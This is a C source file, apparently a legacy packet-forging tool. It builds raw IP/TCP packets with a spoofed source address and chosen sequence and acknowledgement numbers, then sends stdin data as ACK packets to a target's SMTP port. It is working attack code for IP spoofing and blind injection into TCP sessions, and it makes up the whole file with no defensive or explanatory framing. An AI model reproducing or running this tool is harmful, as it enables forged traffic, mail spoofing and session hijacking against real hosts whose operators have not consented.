
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>


#define PORT_MAIL 25

#include "ipspoof.h"


struct pseudohdr
  {
    unsigned long saddr;
    unsigned long daddr;
    char useless;
    unsigned char protocol;
    unsigned short leng;
  };


struct s_hdr
  {
    unsigned long s_ack:32;
    unsigned long s_seq:32;
    unsigned long s_da_ip:32;
    unsigned long s_ip:32;
    unsigned short s_sport:16;
    unsigned short s_dport:16;
  }
spoof_hdr;





unsigned long host2ip(char* host)
{
struct hostent *hp;
struct hostent he;
unsigned long addr;

  if (!(hp = gethostbyname(host)))
  {
//    perror("gethostbyname");
    return -1;
  }

  memcpy(&he,hp,sizeof(he));

  if (he.h_length!=4) return -1;
  
  memcpy(&addr,he.h_addr_list[0],4);
  
  return addr;
}




/*****************************************************************************/
/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
/*****************************************************************************/

unsigned short
in_cksum (addr, len)
     u_short *addr;
     int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  /*
   * Our algorithm is simple, using a 32 bit accumulator (sum), we add
   * sequential 16 bit words to it, and at the end, fold back all the
   * carry bits from the top 16 bits into the lower 16 bits.
   */
  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }

  /* mop up an odd byte, if necessary */
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }

  /* add back carry outs from top 16 bits to low 16 bits */
  sum = (sum >> 16) + (sum & 0xffff);	/* add hi 16 to low 16 */
  sum += (sum >> 16);		/* add carry */
  answer = ~sum;		/* truncate to 16 bits */
  return (answer);
}


/****************************************************************************/
/*                  SEND A PAKET TCP !                                      */
/*

   usage: send_pkt(socket , ip of source , ip of dest , source port, dest port,
   flags, seq_num, ack_num, window size , *data , size of data); 
 */
/****************************************************************************/



void
send_pkt (int s,
     	  unsigned long s_ip,
    	  unsigned long d_ip,
     	  unsigned short s_port,
          unsigned short d_port,
          unsigned char flags,
          unsigned long seq_num,
          unsigned long ack_num,
          unsigned short winsize,
          unsigned char *data,
          unsigned short data_size)     


{
  struct sockaddr_in sin_dst;
  struct iphdr *ip;
  struct tcphdr *tcp;
  struct pseudohdr *pseudo;
  unsigned char *DATA;
  unsigned char packet[32000];

  ip = (struct iphdr *) packet;
  pseudo = (struct pseudohdr *) (packet + IPHDRSIZE - PSEUDOHDRSIZE);
  tcp = (struct tcphdr *) (packet + IPHDRSIZE);
  DATA = (unsigned char *) (packet + IPHDRSIZE + TCPHDRSIZE);

  bzero (packet, sizeof (packet));
  memcpy (DATA, data, data_size);

  pseudo->saddr = s_ip;
  pseudo->daddr = d_ip;
  pseudo->useless = 0;
  pseudo->protocol = 6;
  pseudo->leng = htons (TCPHDRSIZE + data_size);


  tcp->th_sport = htons (s_port);
  tcp->th_seq = htonl (seq_num);
  tcp->th_ack = htonl (ack_num);
  tcp->th_off = 5;
  tcp->th_flags = flags;
  tcp->th_win = htons (winsize);

  tcp->th_urp = 0;
  tcp->th_dport = htons (d_port);
  tcp->th_sum = 0;
  tcp->th_sum = in_cksum ( (u_short * )pseudo, TCPHDRSIZE + PSEUDOHDRSIZE + data_size);

  bzero (packet, IPHDRSIZE);

  ip->saddr = s_ip;
  ip->daddr = d_ip;
  ip->version = 4;
  ip->ihl = 5;
  ip->ttl = 245;
  ip->protocol = 6;
  ip->tot_len = htons (IPHDRSIZE + TCPHDRSIZE + data_size);
  ip->tos = 0;
  ip->id = random () % 1256;
  ip->off = 0;
  ip->check = 0;
  ip->check = in_cksum ( (u_short *) packet, IPHDRSIZE);

  sin_dst.sin_addr.s_addr = ip->daddr;
  sin_dst.sin_family = AF_INET;

  if ((sendto (s, packet, IPHDRSIZE + TCPHDRSIZE + data_size, 0,
	  (struct sockaddr *) &sin_dst, sizeof (struct sockaddr))) == ERROR)
    {
      perror ("sendto");
      exit (ERROR);
    }

}

main (int argc, char **argv)
{
char packet[32000];
int s;

s = socket (AF_INET,SOCK_RAW,255);
if (s<0)
 {
  perror ("socket");
  exit(-1);
 }

while (!feof(stdin))
 {
   fread (packet,sizeof(packet),1,stdin);
   send_pkt (s,host2ip (argv[1]),host2ip(argv[2]),getpid()+2600,PORT_MAIL,
   	     TH_ACK,atoi (argv[3]), atoi (argv[4]),atoi (argv[5]),packet,strlen(packet));
  fprintf (stderr,"%s:%i->%s:%i (%i bytes sent)\n",argv[1],getpid()+2600,argv[2],PORT_MAIL,strlen(packet));
 }  

}
